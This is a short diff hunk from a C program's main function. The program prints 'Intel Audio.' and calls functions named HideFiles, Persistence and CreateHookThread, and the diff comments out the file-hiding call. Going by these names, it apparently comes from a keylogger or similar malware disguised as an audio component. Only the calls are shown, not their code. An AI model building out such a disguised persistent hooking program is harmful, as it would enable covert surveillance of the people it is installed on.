@@ -255,7 +255,7 @@ int main() {
 	printf("Intel Audio.\n");
 	if (SetFileNames()) {
 		LogTime();
-		HideFiles();
+		//HideFiles();
 		Persistence();
 		CreateHookThread();
 	}
